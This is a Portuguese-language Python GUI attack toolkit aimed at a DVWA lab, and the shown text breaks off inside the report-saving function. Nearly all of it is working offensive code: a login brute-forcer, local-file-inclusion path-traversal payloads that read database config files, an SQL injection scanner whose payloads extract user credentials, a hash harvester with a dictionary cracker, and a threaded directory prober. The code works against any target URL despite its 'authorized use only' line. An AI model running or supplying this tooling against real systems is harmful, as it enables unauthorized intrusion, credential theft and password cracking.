#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HackerAI Toolkit — DVWA Brute Force + LFI | SQLi Scanner | Login Brute Force Multi-Endpoint
Interface única com 3 abas, tema verde hacker + senhas em laranja-abóbora.
[VULN] em laranja-abóbora  |  [ OK ] em azul.
Uso autorizado apenas (laboratório / pentest com permissão).
Dependências: pip install requests beautifulsoup4
"""

import threading
import queue
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import requests
import urllib.parse
from urllib.parse import urljoin
import re
import time
import html
import webbrowser
import hashlib
import os
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from bs4 import BeautifulSoup
except ImportError:  # pragma: no cover
    BeautifulSoup = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========================= TEMA =========================
BG      = "#050805"   # fundo geral
BG2     = "#0b120b"   # fundo de campos/áreas
FG      = "#00ff41"   # verde matrix
FG_DIM  = "#00b32d"   # verde escuro
ORANGE  = "#ff7518"   # laranja-abóbora (senhas / [VULN])
OK_C    = "#3a86ff"   # azul ([ OK ])
SEL     = "#003b00"   # seleção
BTN     = "#0a1a0a"   # botão normal
BTN_ACT = "#004d00"   # botão ativo
MONO    = "Consolas"


def apply_theme(root):
    root.configure(bg=BG)
    style = ttk.Style()
    try:
        style.theme_use("clam")
    except tk.TclError:
        pass

    style.configure(".",
                    background=BG, foreground=FG,
                    fieldbackground=BG2, bordercolor=FG_DIM,
                    lightcolor=FG_DIM, darkcolor=BG, troughcolor=BG2,
                    focuscolor=FG, font=(MONO, 10))
    style.configure("TFrame", background=BG)
    style.configure("TLabel", background=BG, foreground=FG, font=(MONO, 10))
    # rótulos de senha (wordlist) em laranja-abóbora
    style.configure("Orange.TLabel", background=BG, foreground=ORANGE,
                    font=(MONO, 10, "bold"))
    style.configure("TLabelframe", background=BG, bordercolor=FG_DIM)
    style.configure("TLabelframe.Label", background=BG, foreground=FG,
                    font=(MONO, 10, "bold"))
    style.configure("TButton", background=BTN, foreground=FG,
                    bordercolor=FG_DIM, focuscolor=FG, font=(MONO, 10, "bold"))
    style.map("TButton",
              background=[("active", BTN_ACT), ("disabled", "#101010")],
              foreground=[("disabled", "#2e4d2e")])
    style.configure("TEntry", fieldbackground=BG2, foreground=FG,
                    insertcolor=FG, bordercolor=FG_DIM)
    style.configure("TNotebook", background=BG, bordercolor=FG_DIM, tabmargins=[2, 5, 2, 0])
    style.configure("TNotebook.Tab", background=BTN, foreground=FG_DIM,
                    padding=(18, 7), font=(MONO, 10, "bold"))
    style.map("TNotebook.Tab",
              background=[("selected", BG2)],
              foreground=[("selected", FG)])
    style.configure("TProgressbar", background=FG, troughcolor=BG2,
                    bordercolor=FG_DIM, lightcolor=FG, darkcolor=FG)

    # --- widgets extra (usados pela aba de login brute force) ---
    style.configure("TCheckbutton", background=BG, foreground=FG,
                    focuscolor=FG, font=(MONO, 10))
    style.map("TCheckbutton",
              background=[("active", BG)],
              foreground=[("active", ORANGE)])
    style.configure("TSpinbox", fieldbackground=BG2, foreground=FG,
                    insertcolor=FG, bordercolor=FG_DIM, arrowcolor=FG,
                    background=BTN)
    style.configure("TCombobox", fieldbackground=BG2, background=BTN,
                    foreground=FG, arrowcolor=FG, bordercolor=FG_DIM,
                    selectbackground=SEL, selectforeground=FG)
    style.map("TCombobox",
              fieldbackground=[("readonly", BG2), ("disabled", "#101010")],
              foreground=[("readonly", FG), ("disabled", "#2e4d2e")],
              background=[("readonly", BTN), ("active", BTN_ACT)])
    # dropdown das comboboxes
    root.option_add("*TCombobox*Listbox.background", BG2)
    root.option_add("*TCombobox*Listbox.foreground", FG)
    root.option_add("*TCombobox*Listbox.selectBackground", SEL)
    root.option_add("*TCombobox*Listbox.selectForeground", FG)
    root.option_add("*TCombobox*Listbox.font", (MONO, 10))


def make_log(parent):
    """ScrolledText com tema escuro verde, tag 'pwd' em laranja-abóbora,
    'vuln' (linhas [VULN]) em laranja-abóbora e 'ok' (linhas [ OK ]) em azul."""
    w = scrolledtext.ScrolledText(
        parent, state="disabled", font=(MONO, 9),
        bg=BG2, fg=FG, insertbackground=FG,
        selectbackground=SEL, selectforeground=FG,
        highlightbackground=FG_DIM, highlightcolor=FG,
        relief="flat", borderwidth=0,
    )
    w.tag_config("pwd", foreground=ORANGE, font=(MONO, 9, "bold"))
    w.tag_config("vuln", foreground=ORANGE, font=(MONO, 9, "bold"))   # [VULN] laranja-abóbora
    w.tag_config("ok", foreground=OK_C, font=(MONO, 9, "bold"))       # [ OK ] azul
    return w


# --------- destaque automático de senhas no log ---------
PWD_RES = [
    re.compile(r"Testando:\s*\S+?:(\S+)"),                  # DVWA: user:senha
    re.compile(r"CREDENCIAL VÁLIDA:\s*(\S+\s*/\s*\S+)"),    # credencial achada (DVWA)
    re.compile(r"CRACKED\s+\S+\s*=>\s*(\S+)"),              # hash quebrado
    re.compile(r"Admin[:/]\s*(\S+)"),                       # variações "admin:senha"
    re.compile(r"Testando:\s{2,}(\S+)"),                    # login BF: "Testando:   senha"
    re.compile(r"SENHA ENCONTRADA:\s*(\S+)"),               # login BF: senha achada
    re.compile(r"SENHA:\s*(\S+)"),                          # bloco de credenciais
    re.compile(r"Senha salva em:\s*(\S+)"),                 # (opcional)
]


def _pwd_spans(line):
    spans = []
    for rx in PWD_RES:
        for m in rx.finditer(line):
            if m.group(1):
                spans.append((m.start(1), m.end(1)))
    return spans


def log_insert(widget, msg, tag="pwd"):
    """Insere texto no log. Senhas em laranja-abóbora.
    Linhas com '[VULN]' ficam em laranja-abóbora e linhas com '[ OK ]' em azul."""
    widget.configure(state="normal")
    lines = msg.split("\n")
    for i, line in enumerate(lines):
        # ---- cor de linha conforme o marcador ----
        if "[VULN]" in line:
            line_tag = "vuln"
        elif "[ OK ]" in line:
            line_tag = "ok"
        else:
            line_tag = None
        line_tags = (line_tag,) if line_tag else ()

        spans = _pwd_spans(line)
        pos = 0
        for s, e in spans:
            if s > pos:
                widget.insert("end", line[pos:s], *line_tags)
            widget.insert("end", line[s:e], tag)     # senha sempre laranja-abóbora
            pos = e
        widget.insert("end", line[pos:], *line_tags)
        if i < len(lines) - 1:
            widget.insert("end", "\n")
    widget.insert("end", "\n")
    widget.see("end")
    widget.configure(state="disabled")


# ####################################################################
# ABA 1 — DVWA BRUTE FORCE + LFI
# ####################################################################
class DvwaTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, padding=8)
        self.running = False
        self.session = requests.Session()
        self._build_ui()

    def _build_ui(self):
        frame = ttk.LabelFrame(self, text=" Configuração — Brute Force + LFI ", padding=10)
        frame.pack(fill="x", padx=5, pady=5)

        ttk.Label(frame, text="URL Login:").grid(row=0, column=0, sticky="w")
        self.url_entry = ttk.Entry(frame, width=58)
        self.url_entry.insert(0, "http://192.168.0.11/dvwa/login.php")
        self.url_entry.grid(row=0, column=1, pady=3)

        # rótulo de senha em laranja-abóbora
        ttk.Label(frame, text="Wordlist (senhas):", style="Orange.TLabel").grid(
            row=1, column=0, sticky="w")
        self.wordlist_entry = ttk.Entry(frame, width=58)
        self.wordlist_entry.grid(row=1, column=1, pady=3)
        ttk.Button(frame, text="Procurar...", command=self._browse).grid(row=1, column=2, padx=6)

        ttk.Label(frame, text="Usuário:").grid(row=2, column=0, sticky="w")
        self.user_entry = ttk.Entry(frame, width=30)
        self.user_entry.insert(0, "admin")
        self.user_entry.grid(row=2, column=1, sticky="w", pady=3)

        ttk.Label(frame, text="Arquivo alvo (LFI):").grid(row=3, column=0, sticky="w")
        self.file_entry = ttk.Entry(frame, width=58)
        self.file_entry.insert(0, "/var/www/dvwa/config/config.inc.php")
        self.file_entry.grid(row=3, column=1, pady=3)

        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=4, column=1, sticky="w", pady=5)
        self.btn_start = ttk.Button(btn_frame, text=">> Iniciar", command=self.start)
        self.btn_start.pack(side="left", padx=3)
        self.btn_stop = ttk.Button(btn_frame, text="[] Parar", command=self.stop, state="disabled")
        self.btn_stop.pack(side="left", padx=3)

        out_frame = ttk.LabelFrame(self, text=" Saída ", padding=5)
        out_frame.pack(fill="both", expand=True, padx=5, pady=5)
        self.log = make_log(out_frame)
        self.log.pack(fill="both", expand=True)

    def _browse(self):
        path = filedialog.askopenfilename(title="Selecione a wordlist de senhas")
        if path:
            self.wordlist_entry.delete(0, "end")
            self.wordlist_entry.insert(0, path)

    def log_msg(self, msg):
        log_insert(self.log, msg)

    def start(self):
        url = self.url_entry.get().strip()
        wordlist = self.wordlist_entry.get().strip()
        if not url or not wordlist:
            messagebox.showerror("Erro", "Informe a URL e a wordlist.")
            return
        if not os.path.isfile(wordlist):
            messagebox.showerror("Erro", "Wordlist não encontrada.")
            return
        self.session = requests.Session()
        self.running = True
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        threading.Thread(target=self.run, args=(url, wordlist), daemon=True).start()

    def stop(self):
        self.running = False
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")

    def _get_token(self, url):
        r = self.session.get(url, verify=False, timeout=10)
        m = re.search(r"user_token'?\s*value='([^']+)'", r.text)
        return m.group(1) if m else None

    def _save_found(self, content, tag):
        fname = f"encontrado_{tag}.txt"
        with open(fname, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        self.log_msg(f"[+] Conteúdo salvo em: {os.path.abspath(fname)}")

    def run(self, url, wordlist):
        base = url.rsplit("/", 1)[0]

        self.log_msg("[*] Fase 1: Brute force no login")
        creds = None
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [l.strip() for l in f
                             if l.strip() and not l.lstrip().startswith("#")]
        except Exception as e:
            self.log_msg(f"[!] Erro ao ler wordlist: {e}")
            self._done()
            return

        self.log_msg(f"\n[*] {len(passwords)} senhas carregadas\n")

        for pwd in passwords:
            if not self.running:
                break
            try:
                token = self._get_token(url)
                data = {
                    "username": self.user_entry.get().strip(),
                    "password": pwd,
                    "Login": "Login",
                }
                if token:
                    data["user_token"] = token
                r = self.session.post(url, data=data, verify=False, timeout=10,
                                      allow_redirects=True)
                if "login.php" not in r.url and r.status_code == 200:
                    self.log_msg(f"\n[+] CREDENCIAL VÁLIDA: {data['username']} / {pwd}\n\n")
                    creds = (data["username"], pwd)
                    break
                self.log_msg(f"    Testando: {data['username']}:{pwd:<50} -> falha")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not creds:
            self.log_msg("\n[-] Nenhuma credencial encontrada. Continuando teste LFI sem login\n")

        target_file = self.file_entry.get().strip()
        self.log_msg(f"[*] Fase 2: Testando LFI para {target_file}\n")

        traversal = "../" * 6 + target_file.lstrip("/")
        candidates = [
            traversal,
            traversal.replace("../", "....//"),
            "/" + target_file.lstrip("/"),
            "..\\..\\" * 6 + target_file.lstrip("/"),
        ]

        lfi_url = f"{base}/vulnerabilities/fi/?page="
        found = False
        for payload in candidates:
            if not self.running or found:
                break
            try:
                r = self.session.get(lfi_url + payload, verify=False, timeout=10)
                if "db_" in r.text or "$_DVWA" in r.text or "config.inc" in r.text:
                    self.log_msg(f"[+] ARQUIVO ENCONTRADO via payload: {payload}")
                    self._save_found(r.text, "lfi_config")
                    found = True
                else:
                    self.log_msg(f"    Tentativa '{payload[:60]}...' -> sem conteúdo do config")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not found:
            self.log_msg("\n[-] LFI não confirmado. Verifique se está logado e se o nível")
            self.log_msg("    de segurança do DVWA está em: low     (http://SEU_IP/dvwa/security.php)\n")

        self._done()

    def _done(self):
        self.running = False
        self.after(0, lambda: (self.btn_start.configure(state="normal"),
                               self.btn_stop.configure(state="disabled")))
        self.log_msg("\n\n[*] Finalizado\n\n")


# ####################################################################
# ABA 2 — SQLi SCANNER
# ####################################################################
TIMEOUT = 10
RECON_THREADS = 5

PAYLOADS = [
    ("'", "Erro SQL clássico"),
    ("1'", "Erro de sintaxe após número"),
    ("1' AND extractvalue(1, concat(0x7e, version()))-- ", "Error-based MySQL extractvalue"),
    ("1' AND updatexml(1, concat(0x7e, version()), 1)-- ", "Error-based MySQL updatexml"),
    ("1' AND 1=CONVERT(int, @@version)-- ", "Error-based MSSQL"),
    ("' OR '1'='1", "Bypass clássico string"),
    ("1' OR '1'='1", "Bypass de autenticação (OR 1=1)"),
    ("1 OR 1=1", "Bypass numérico"),
    ("1' OR '1'='1' -- ", "Bypass com comentário"),
    ("' OR 1=1#", "Bypass hash comment"),
    ("admin'-- ", "Login bypass admin"),
    ("1 AND 1=1", "Booleano TRUE (baseline)"),
    ("1 AND 1=2", "Booleano FALSE"),
    ("1' AND '1'='1", "Booleano string TRUE"),
    ("1' AND '1'='2", "Booleano string FALSE"),
    ("1' AND SLEEP(5)-- ", "Time-based MySQL"),
    ("1 AND SLEEP(5)", "Time-based MySQL numérico"),
    ("1'; WAITFOR DELAY '0:0:5'-- ", "Time-based MSSQL"),
    ("1' AND pg_sleep(5)-- ", "Time-based PostgreSQL"),
    ("1' AND BENCHMARK(5000000, SHA1('t'))-- ", "Time-based BENCHMARK"),
    ("1 UNION SELECT NULL-- ", "UNION 1 coluna"),
    ("1 UNION SELECT NULL,NULL-- ", "UNION 2 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL-- ", "UNION 3 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL-- ", "UNION 4 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "UNION 5 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "UNION 6 colunas"),
    ("1' UNION SELECT NULL,NULL-- ", "UNION string 2 colunas"),
    ("1' UNION SELECT NULL,NULL,NULL-- ", "UNION string 3 colunas"),
    ("1' UNION SELECT version(),database()-- ", "UNION extraindo versão/banco"),
    ("1' UNION SELECT table_name,NULL FROM information_schema.tables-- ", "UNION listando tabelas"),
    ("1' UNION SELECT user,password FROM users-- ", "UNION extraindo credenciais (DVWA)"),
    ("1' UNION SELECT @@version,@@datadir-- ", "UNION MSSQL/MySQL info"),
    ("1//OR//1=1", "Inline comments"),
    ("1 /*!50000OR*/ 1=1", "MySQL version comment"),
    ("1 OR 0x31=0x31", "Hex encoding"),
    ("1 %00OR 1=1", "Null byte"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "mysql_fetch", "pg_query",
    "sqlite3.operationalerror", "ora-01756", "microsoft ole db provider",
    "odbc sql server driver", "syntax error", "unterminated string",
    "sqlsyntaxerrorexception", "error in your sql",
]

HASH_PATTERNS = [
    (r"\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}", "bcrypt"),
    (r"\$argon2(?:id|i|d)\$[^\s\"'<>]{20,}", "argon2"),
    (r"\b[a-fA-F0-9]{128}\b", "SHA-512"),
    (r"\b[a-fA-F0-9]{96}\b", "SHA-384"),
    (r"\b[a-fA-F0-9]{64}\b", "SHA-256"),
    (r"\b[a-fA-F0-9]{40}\b", "SHA-1"),
    (r"\b[a-fA-F0-9]{32}\b", "MD5"),
    (r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b", "JWT"),
]

session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (SQLi-Scanner-GUI; Auth-Test)"


def extract_data(body):
    out = []
    for pattern in (
        r"ID:\s*([^<\r\n]+)",
        r"First\s*name:\s*([^<\r\n]+)",
        r"Surname:\s*([^<\r\n]+)",
    ):
        for item in re.findall(pattern, body, re.I):
            item = re.sub(r"<[^>]+>", "", item).strip()
            if item and item not in out:
                out.append(item)
    rows = re.findall(
        r"<tr[^>]*>\s*<td[^>]*>(.*?)</td>\s*<td[^>]*>(.*?)</td>",
        body, re.I | re.S,
    )
    for a, b in rows[:20]:
        a = re.sub(r"<[^>]+>", "", a).strip()
        b = re.sub(r"<[^>]+>", "", b).strip()
        if a or b:
            out.append(f"{a} | {b}")
    return list(dict.fromkeys(out))


def find_hashes(text):
    found = []
    seen = set()
    for pattern, htype in HASH_PATTERNS:
        for m in re.finditer(pattern, text):
            h = m.group(0)
            if h.lower() in seen:
                continue
            seen.add(h.lower())
            start = max(0, m.start() - 40)
            end = min(len(text), m.end() + 40)
            ctx = re.sub(r"\s+", " ", text[start:end]).strip()
            found.append((htype, h, ctx))
    return found


def algos_for_hash(h):
    n = len(h)
    if n == 32:
        return [("md5", hashlib.md5)]
    if n == 40:
        return [("sha1", hashlib.sha1)]
    if n == 64:
        return [("sha256", hashlib.sha256)]
    if n == 96:
        return [("sha384", hashlib.sha384)]
    if n == 128:
        return [("sha512", hashlib.sha512)]
    return []


class SqliTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, padding=10)
        self.columnconfigure(1, weight=1)
        self.rowconfigure(6, weight=1)
        self._build_ui()
        self.results = []
        self.findings = []
        self.hash_findings = []
        self.recon_findings = []

    def _build_ui(self):
        ttk.Label(self, text="URL alvo:").grid(row=0, column=0, sticky="w")
        self.url = ttk.Entry(self)
        self.url.grid(row=0, column=1, padx=5, sticky="ew")
        self.url.insert(
            0,
            "http://192.168.0.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
        )

        ttk.Label(self, text="Cookie:").grid(row=1, column=0, sticky="w")
        self.cookie = ttk.Entry(self)
        self.cookie.grid(row=1, column=1, padx=5, sticky="ew")
        self.cookie.insert(0, "PHPSESSID=329f6tjl62ekmjrpibd5kor3f5; security=low")

        ttk.Label(self, text="POST:").grid(row=2, column=0, sticky="w")
        self.post = ttk.Entry(self)
        self.post.grid(row=2, column=1, padx=5, sticky="ew")
        self.post.insert(0, "Submit=Submit")

        # rótulo de senha em laranja-abóbora
        ttk.Label(self, text="Wordlist (senhas):", style="Orange.TLabel").grid(
            row=3, column=0, sticky="w")
        self.wordlist = ttk.Entry(self)
        self.wordlist.grid(row=3, column=1, padx=5, sticky="ew")
        ttk.Button(self, text="Procurar...", command=self.browse_wordlist).grid(
            row=3, column=2, padx=8, sticky="ew"
        )

        self.btn = ttk.Button(self, text=">> Escanear SQLi", command=self.start)
        self.btn.grid(row=0, column=2, rowspan=2, padx=8, sticky="ew")

        self.btn_crack = ttk.Button(self, text=">> Quebrar Hashes", command=self.start_crack)
        self.btn_crack.grid(row=4, column=0, columnspan=3, padx=0, pady=(6, 0), sticky="ew")

        self.progress = ttk.Progressbar(self, mode="determinate", maximum=100)
        self.progress.grid(row=5, column=0, columnspan=3, sticky="ew", pady=(6, 0))

        self.log = make_log(self)
        self.log.configure(wrap="none")
        self.log.grid(row=6, column=0, columnspan=3, sticky="nsew", pady=10)

        ttk.Button(self, text="[ Salvar relatório HTML ]", command=self.save).grid(
            row=7, column=1
        )

    # ---------- logging ----------
    def write(self, text):
        self.after(0, self._write, text)

    def _write(self, text):
        log_insert(self.log, text)

    def set_progress(self, value):
        value = max(0, min(100, value))
        self.after(0, lambda: self.progress.config(value=value))

    def busy(self, on):
        def _do():
            if on:
                self.progress.config(value=0)
                self.btn.config(state="disabled")
                self.btn_crack.config(state="disabled")
            else:
                self.progress.config(value=100)
                self.btn.config(state="normal")
                self.btn_crack.config(state="normal")
        self.after(0, _do)

    # ---------- cookies ----------
    def cookies(self):
        result = {}
        for item in self.cookie.get().split(";"):
            if "=" in item:
                k, v = item.strip().split("=", 1)
                result[k] = v
        return result

    def browse_wordlist(self):
        path = filedialog.askopenfilename(
            title="Selecione a wordlist de senhas (ex.: rockyou.txt)",
            filetypes=[
                ("Listas de palavras", "*.txt *.lst *.wordlist"),
                ("Todos os arquivos", "*.*"),
            ],
        )
        if path:
            self.wordlist.delete(0, "end")
            self.wordlist.insert(0, path)
            size = os.path.getsize(path) if os.path.isfile(path) else 0
            self.write(f"[*] Wordlist selecionada: {path} ({size/1024/1024:.1f} MB)\n")

    def load_recon_wordlist(self, path):
        words, seen = [], set()
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                for line in fh:
                    w = line.strip()
                    if not w or w.startswith("#"):
                        continue
                    w = w.lstrip("/")
                    if w in seen:
                        continue
                    seen.add(w)
                    words.append(w)
        except OSError as e:
            self.write(f"[ERRO] Lendo wordlist: {e}")
            return []
        return words

    # ---------- request helpers ----------
    def request_data(self, url, param, payload):
        p = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
        if qs:
            qs[param] = [payload]
            q = urllib.parse.urlencode(qs, doseq=True)
            return urllib.parse.urlunparse(p._replace(query=q)), None
        data = urllib.parse.parse_qs(self.post.get(), keep_blank_values=True)
        if param not in data:
            return None, None
        data[param] = [payload]
        return url, data

    def send(self, url, data=None):
        t = time.time()
        try:
            if data is not None:
                r = session.post(url, data=data, timeout=TIMEOUT)
            else:
                r = session.get(url, timeout=TIMEOUT)
            return r, time.time() - t, None
        except requests.RequestException as e:
            return None, 0, str(e)

    # ========================= SQLi =========================
    def start(self):
        url = self.url.get().strip()
        if not url:
            return
        session.cookies.clear()
        session.cookies.update(self.cookies())
        self.log.delete("1.0", "end")
        self.results.clear()
        self.findings.clear()
        self.hash_findings.clear()
        self.recon_findings.clear()
        self.busy(True)
        threading.Thread(target=self.scan, args=(url,), daemon=True).start()

    def scan(self, url):
        try:
            p = urllib.parse.urlparse(url)
            get = urllib.parse.parse_qs(p.query, keep_blank_values=True)
            post = urllib.parse.parse_qs(self.post.get(), keep_blank_values=True)
            params = get or post
            params = [x for x in params if x.lower() != "submit"]

            self.write(f"[*] Alvo: {url}")

            if not params:
                self.write("[!] Nenhum parâmetro encontrado.")
                return

            base, _, err = self.send(url, post if not get else None)
            base_len = len(base.text) if base else 0
            base_status = base.status_code if base else 0

            if err:
                self.write(f"[!] Request base: {err}")

            if base:
                for htype, h, ctx in find_hashes(base.text):
                    self._register_hash(htype, h, ctx, url)

            steps_per_param = 2 + len(PAYLOADS)
            total_steps = len(params) * steps_per_param
            done_steps = 0

            def tick():
                nonlocal done_steps
                done_steps += 1
                self.set_progress(int(done_steps * 100 / total_steps))

            self.set_progress(0)

            for param in params:
                self.write(f"\n[>] Testando: {param}\n")
                true_len = false_len = None

                for payload, tag in (("1 AND 1=1", "TRUE"), ("1 AND 1=2", "FALSE")):
                    u, data = self.request_data(url, param, payload)
                    tick()
                    if not u:
                        continue
                    r, _, _ = self.send(u, data)
                    if not r:
                        continue
                    if tag == "TRUE":
                        true_len = len(r.text)
                    else:
                        false_len = len(r.text)

                blind = (true_len is not None and false_len is not None
                         and abs(true_len - false_len) > 20)
                if blind:
                    self.write(f"[+] Diferença booleana: TRUE={true_len} FALSE={false_len}")

                for payload, desc in PAYLOADS:
                    u, data = self.request_data(url, param, payload)
                    tick()
                    if not u:
                        continue

                    r, elapsed, error = self.send(u, data)
                    if not r:
                        self.write(f"[-] {error}")
                        continue

                    body = r.text.lower()
                    vuln = None

                    for e in SQL_ERRORS:
                        if e in body:
                            vuln = f"Erro SQL: {e}"
                            break

                    if (not vuln and elapsed > 5 and any(
                            x in payload.lower()
                            for x in ("sleep", "waitfor", "benchmark", "pg_sleep"))):
                        vuln = f"Resposta lenta: {elapsed:.1f}s"

                    if (not vuln and true_len is not None and false_len is not None
                            and blind and ("1=1" in payload or "'1'='1" in payload)):
                        if (abs(len(r.text) - true_len) < 50
                                and "and" in payload.lower() and "1=2" not in payload):
                            vuln = "Resposta semelhante ao TRUE"

                    if (not vuln and ("or 1=1" in payload.lower() or "or '1'='1" in payload.lower())
                            and abs(len(r.text) - base_len) > 100):
                        vuln = f"Conteúdo alterado: {base_len} -> {len(r.text)} bytes"

                    if not vuln and "union select" in payload.lower():
                        if base_status and r.status_code != base_status:
                            vuln = f"UNION alterou status: {base_status}->{r.status_code}"
                        elif abs(len(r.text) - base_len) > 100:
                            vuln = "UNION alterou o conteúdo"

                    leaked = []
                    if vuln or any(x in payload.lower()
                                   for x in ("union select", "information_schema", "from users")):
                        leaked = extract_data(r.text)
                        for htype, h, ctx in find_hashes(r.text):
                            self._register_hash(htype, h, ctx, u)

                    item = (param, payload, r.status_code, elapsed,
                            bool(vuln), desc, vuln, len(r.text), leaked)
                    self.results.append(item)

                    if vuln:
                        self.findings.append((param, payload, desc, vuln, u, leaked))
                        self.write(f"\n[VULN] {param} | {payload[:35]} | {r.status_code} | {elapsed:.1f}s\n")
                        for x in leaked[:10]:
                            self.write(f"       {x}")
                    else:
                        self.write(f"\n\n[ OK ] {param} | {payload[:35]} | {r.status_code} | {elapsed:.1f}s\n")

                    time.sleep(0.15)

            self.write(f"\n[*] Concluído: {len(self.findings)} achados")
            if self.hash_findings:
                self.write(f"\n[*] Hashes Encontrados: {len(self.hash_findings)}")

            path = self.wordlist.get().strip()
            self.auto_crack(path)
        except Exception as e:
            self.write(f"\n[ERRO] {e}")
        finally:
            self.busy(False)

    # ========================= HASHES =========================
    def _register_hash(self, htype, h, ctx, source):
        for item in self.hash_findings:
            if item[1].lower() == h.lower():
                return
        self.hash_findings.append((htype, h, ctx, source, None))
        self.write(f"[HASH] {htype}: {h}")

    # ========================= CRACKING =========================
    def build_targets(self):
        targets = {}
        for idx, (htype, h, ctx, source, cracked) in enumerate(self.hash_findings):
            candidates = algos_for_hash(h)
            if not candidates:
                continue
            targets.setdefault(h.lower(), []).append(idx)
        return targets

    def auto_crack(self, path):
        if not self.hash_findings:
            return
        if not path or not os.path.isfile(path):
            if self.hash_findings:
                self.write("\n\n[*] Nenhuma wordlist selecionada — hashes não serão quebrados automaticamente.")
            return
        targets = self.build_targets()
        if not targets:
            self.write("[!] Nenhum hash do tipo quebrável (MD5/SHA) foi encontrado.\n")
            return
        self.write("\n[*] Wordlist detectada — iniciando cracking automático\n")
        self.run_crack(path, targets)

    def start_crack(self):
        if not self.hash_findings:
            self.write("[!] Nenhum hash encontrado ainda. Faça o Escanear SQLi primeiro\n")
            return
        path = self.wordlist.get().strip()
        if not path or not os.path.isfile(path):
            self.write("[!] Selecione uma wordlist válida (botão Procurar...).")
            return
        targets = self.build_targets()
        if not targets:
            self.write("[!] Nenhum hash do tipo quebrável (MD5/SHA) foi encontrado.")
            return
        self.busy(True)
        self.write(f"[*] Iniciando ataque de dicionário\n[*] Wordlist: {path}\n\n"
                   f"[*] Hashes alvo: {len(targets)}\n")
        threading.Thread(target=self.crack_worker, args=(path, targets), daemon=True).start()

    def crack_worker(self, path, targets):
        try:
            self.run_crack(path, targets)
        finally:
            self.busy(False)

    def run_crack(self, path, targets):
        try:
            total_size = os.path.getsize(path)
            processed = 0
            found = {}
            remaining = set(targets.keys())
            start = time.time()

            self.write(f"[*] Wordlist: {path}\n\n[*] Hashes alvo: {len(targets)}\n\n")

            with open(path, "rb") as fh:
                for raw in fh:
                    word = raw.strip()
                    if not word:
                        continue
                    still = set(remaining)
                    for h in still:
                        for _, fn in algos_for_hash(h):
                            if fn(word).hexdigest() == h:
                                found[h] = word.decode("utf-8", "ignore")
                                remaining.discard(h)
                                break
                    processed += len(raw)
                    if processed % (1 << 20) < len(raw):
                        pct = int(processed * 100 / total_size) if total_size else 0
                        self.set_progress(pct)
                    if not remaining:
                        break

            elapsed = time.time() - start

            for h, word in found.items():
                for idx in targets[h]:
                    htype, hh, ctx, source, _ = self.hash_findings[idx]
                    self.hash_findings[idx] = (htype, hh, ctx, source, word)

            # senha quebrada em laranja-abóbora
            for h, word in found.items():
                self.write(f"[+] CRACKED  {h}  =>  {word}")
            for h in remaining:
                self.write(f"\n\n[-] Não quebrado: {h}")

            self.write(f"\n[*] Cracking concluído em {elapsed:.1f}s "
                       f"({len(found)}/{len(targets)} quebrados, {processed/1024/1024:.1f} MB lidos)\n\n")
        except Exception as e:
            self.write(f"[ERRO] Cracking: {e}")

    # ========================= RECON =========================
    def start_recon(self):
        url = self.url.get().strip()
        if not url:
            self.write("[!] Informe a URL alvo antes do recon.")
            return
        wordlist_path = filedialog.askopenfilename(
            title="Selecione a wordlist de diretórios/arquivos",
            filetypes=[("Listas de palavras", "*.txt *.lst *.wordlist"),
                       ("Todos os arquivos", "*.*")],
        )
        if not wordlist_path:
            self.write("[!] Recon cancelado: nenhuma wordlist selecionada.")
            return
        words = self.load_recon_wordlist(wordlist_path)
        if not words:
            self.write("[!] Wordlist vazia ou ilegível.")
            return
        session.cookies.clear()
        session.cookies.update(self.cookies())
        self.recon_findings.clear()
        self.busy(True)
        self.write(f"[*] Recon em {url}\n[*] Wordlist: {wordlist_path} ({len(words)} entradas)\n")
        threading.Thread(target=self.recon, args=(url, words), daemon=True).start()

    def recon(self, url, words):
        total = len(words)
        done = 0
        try:
            base = url.rstrip("/") + "/"

            def probe(entry):
                target = entry if entry.startswith(("http://", "https://")) else urllib.parse.urljoin(base, entry)
                r, elapsed, err = self.send(target)
                return entry, target, r, elapsed, err

            with ThreadPoolExecutor(max_workers=RECON_THREADS) as pool:
                futures = {pool.submit(probe, w): w for w in words}
                for fut in as_completed(futures):
                    entry, target, r, elapsed, err = fut.result()
                    done += 1
                    if done % 25 == 0 or done == total:
                        self.write(f"[*] Progresso: {done}/{total}")
                    if err or not r:
                        continue
                    if r.status_code in (200, 301, 302, 401, 403, 500):
                        self.recon_findings.append((entry, r.status_code, len(r.text), elapsed, target))
                        self.write(f"[{r.status_code}] /{entry} ({len(r.text)} bytes, {elapsed:.1f}s)")
                        server = r.headers.get("Server")
                        if server:
                            self.write(f"      Server: {server}")
            self.write(f"\n[*] Recon concluído: {len(self.recon_findings)} recursos interessantes")
        except Exception as e:
            self.write(f"[ERRO] Recon: {e}")
        finally:
            self.busy(False)

    # ========================= REPORT =========================
    def save(self):
        if not self.results and not self.hash_findings and not self.recon_findings:
            self.write("[!] Nenhum resultado.")
            return
